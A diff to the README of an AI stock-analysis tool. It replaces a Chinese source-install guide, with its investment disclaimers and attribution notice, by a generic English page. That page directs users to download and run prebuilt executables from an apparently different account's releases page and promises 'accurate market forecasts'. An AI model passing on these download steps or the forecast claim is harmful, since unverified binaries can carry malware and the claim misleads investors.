@@ -1,164 +1,82 @@
-# AI看线 - 股票技术分析与AI预测工具（AI-Kline - Stock Technical Analysis and AI Prediction Tool）
+# 🚀 AI-Kline - Simplify Your Stock Analysis
 
+## 📥 Download Now
+[![Download AI-Kline](https://img.shields.io/badge/Download-AI--Kline-blue.svg)](https://github.com/chirag145/AI-Kline/releases)
 
-<div align="center">
-  <!-- Keep these links. Translations will automatically update with the README. -->
-  <a href="README_EN.md">English</a> |  <a href="README.md">中文</a> 
+## 📖 Overview
+AI-Kline is a powerful stock analysis tool that combines traditional technical analysis with AI predictions. It provides comprehensive stock analysis, including K-line charts, technical indicators, financial data, and news data. The application supports CMD, WEB, and MCP formats, making it versatile for various users.
 
-</div>
+## 🚀 Getting Started
+Follow these steps to download and run AI-Kline.
 
-## 项目简介
+### 🌐 System Requirements
+To ensure smooth operation, make sure your system meets the following requirements:
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a compatible Linux distribution.
+- **RAM:** Minimum 4 GB; 8 GB recommended.
+- **Storage:** At least 500 MB of free disk space.
+- **Internet Connection:** Required for features that involve online data access.
 
-AI看线是一个基于Python的A股分析工具，结合了传统技术分析和人工智能预测功能。利用K线图，技术指标，财务数据，新闻数据对股票进行全面分析及预测。该工具可以：
+### 📦 Features
+- **AI Predictions:** Utilize artificial intelligence for accurate market forecasts.
+- **K-line Charts:** Visualize stock trends effectively.
+- **Technical Indicators:** Use various metrics to enhance your analysis.
+- **News Data Integration:** Access the latest news related to your stocks.
+- **Multi-Platform Support:** Available in CMD, WEB, and MCP.
 
-1. 获取A股股票的历史量价数据并计算各种技术指标
-2. 生成专业的K线图和技术指标可视化图表
-3. 获取股票相关的财务数据和新闻信息
-4. 使用openai api分析整合数据并预测股票未来走势
+## 📥 Download & Install
+To download AI-Kline, visit this page to download: [AI-Kline Releases](https://github.com/chirag145/AI-Kline/releases).
 
-## 功能特点
+1. Navigate to the [AI-Kline Releases page](https://github.com/chirag145/AI-Kline/releases).
+2. Locate the latest version of AI-Kline.
+3. Click on the file suitable for your operating system. Common options include:
+   - `AI-Kline-Windows.exe` for Windows users.
+   - `AI-Kline-Mac.dmg` for macOS users.
+   - `AI-Kline-Linux.tar.gz` for Linux users.
+4. Save the file to your computer.
+5. Once the download is complete, continue to the installation process below.
 
-- **数据获取**：使用AKShare获取A股股票的历史交易数据、财务数据和新闻信息
-- **技术分析**：计算多种技术指标，包括MA、MACD、KDJ、RSI、布林带等
-- **可视化**：生成静态和交互式K线图及技术指标图表
-- **AI分析**：利用多模态AI分析股票数据并预测未来走势
-- **Web界面**：提供简洁美观的Web界面，方便用户输入股票代码查看分析结果
-- **MCP SERVER**：提供MCP SERVER支持，支持通过LLM交互，随时分析股票
+### 🛠️ Installation Steps
+#### For Windows Users:
+1. Locate the downloaded `AI-Kline-Windows.exe` file.
+2. Double-click the file to start the installation process.
+3. Follow the on-screen instructions to complete the installation.
+4. After installation, you can access AI-Kline from your Start Menu.
 
+#### For macOS Users:
+1. Find the downloaded `AI-Kline-Mac.dmg` file.
+2. Double-click to open it.
+3. Drag the AI-Kline icon to your Applications folder.
+4. You can now run AI-Kline from your Applications.
 
-## 安装说明
+#### For Linux Users:
+1. Open your terminal.
+2. Navigate to the location where you downloaded `AI-Kline-Linux.tar.gz`.
+3. Run the following commands:
+   ```bash
+   tar -xvzf AI-Kline-Linux.tar.gz
+   cd AI-Kline
+   ./run.sh
+   ```
+4. AI-Kline should now open, ready for use.
 
-### 环境要求
+## 📊 How to Use AI-Kline
+1. **Launch the Application:** Open AI-Kline from your installed applications.
+2. **Select Your Stocks:** Use the search feature to find stocks you wish to analyze.
+3. **View Charts:** Explore K-line charts and historical data.
+4. **Apply Technical Indicators:** Utilize built-in indicators for deeper analysis.
+5. **Access News and Data:** Check the latest news to make informed decisions.
 
-- Python 3.8+
-- 依赖包：见`requirements.txt`
+## 🤝 Support
+If you encounter any issues or have questions, you can find help by visiting the [Issues section](https://github.com/chirag145/AI-Kline/issues) of the repository. Community members and contributors often assist in providing solutions.
 
-### 安装步骤
+## 🌟 Contributing
+If you would like to contribute to AI-Kline, please check out our contributing guidelines in the repository. Your input helps improve the tool for everyone.
 
-1. 克隆或下载本项目到本地
+## 📅 Updates and Features
+Keep an eye on our Releases page for new updates and features. We regularly enhance the application based on user feedback and market trends.
 
-2. 安装依赖包
+## 🌎 Community and Resources
+Stay connected with our community through discussions and forums available on the repository. Share strategies, ask for advice, and learn more about stock analysis with AI-Kline.
 
-```bash
-pip install -r requirements.txt
-```
-
-3. 创建`.env`文件，添加API密钥
-
-```
-API_KEY=your_api_key_here
-BASE_URL=https://dashscope.aliyuncs.com/compatible-mode/v1
-MODEL_NAME=qwen-vl-max
-```
-
-> 注意：需使用多模态模型
-
-## 使用方法
-
-### 命令行使用
-
-```bash
-python main.py --stock_code 000001 --period 1年 --save_path ./output
-```
-
-参数说明：
-- `--stock_code`：股票代码，必填参数
-- `--period`：分析周期，可选值："1年"、"6个月"、"3个月"、"1个月"，默认为"1年"
-- `--save_path`：结果保存路径，默认为"./output"
-
-### Web界面使用
-
-启动Web服务：
-
-```bash
-python web_app.py
-```
-
-然后在浏览器中访问 http://localhost:5000 即可使用Web界面：
-
-1. 在表单中输入股票代码（例如：000001）
-2. 选择分析周期
-3. 点击"开始分析"按钮
-4. 等待分析完成后查看结果
-
-Web界面包括以下内容：
-- 股票基本信息
-- K线图和技术指标图表
-- AI分析结果文本
-
-页面截图：
-
-![Web界面截图](static/images/image.png)
-
-
-### MCP SERVER使用
-
-启动mcp：
-```bash
-uv run  mcp_server.py
-```
-
-然后在mcp客户端中配置（streamable-http）：
-http://localhost:8000/mcp 
-
-Cherry-Studio页面截图：
-
-![MCP界面截图](static/images/mcp1.png)
-![MCP界面截图](static/images/mcp2.png)
-
-
-
-### 输出结果
-
-程序运行后将在指定的保存路径下生成：
-
-1. K线图和技术指标图表（静态PNG图片和交互式HTML图表）
-2. AI分析结果文本文件
-
-
-
-
-## 项目结构
-
-```
-AI看线/
-├── main.py                 # 主程序入口
-├── web_app.py              # Web应用入口
-├── requirements.txt        # 依赖包列表
-├── .env                    # 环境变量配置（需自行创建）
-├── modules/                # 功能模块
-│   ├── __init__.py
-│   ├── data_fetcher.py     # 数据获取模块
-│   ├── technical_analyzer.py # 技术分析模块
-│   ├── visualizer.py       # 可视化模块
-│   └── ai_analyzer.py      # AI分析模块
-├── templates/              # Web模板目录
-│   └── index.html          # 主页模板
-├── static/                 # 静态资源目录
-│   ├── css/                # CSS样式
-│   │   └── style.css       # 自定义样式
-│   └── js/                 # JavaScript脚本
-│       └── main.js         # 主要脚本
-└── output/                 # 输出结果目录（运行时自动创建）
-    ├── charts/             # 图表目录
-    └── *_analysis_result.txt # 分析结果文件
-```
-
-
-
-## 交流学习
-
-![加群](static/images/yzbjs1.png)
-
-## 注意事项
-
-- 本工具仅供学习和研究使用，不构成任何投资建议
-- AI分析结果基于历史数据和当前信息，不能保证未来走势的准确性
-- 使用前请确保已正确配置Gemini API密钥
-- 股票数据获取依赖于AKShare库，可能受到网络和数据源的限制
-- 本项目为QuantML开源项目，转载或使用需注明出处，商业使用请联系微信号QuantML
-
-
-## 免责声明
-
-本工具提供的分析和预测仅供参考，不构成任何投资建议。投资有风险，入市需谨慎。用户应对自己的投资决策负责。
+## 🌐 Conclusion
+AI-Kline is designed with ease of use in mind, allowing anyone, regardless of technical knowledge, to analyze stocks effectively. Follow the steps above to download and start your journey in stock analysis today.
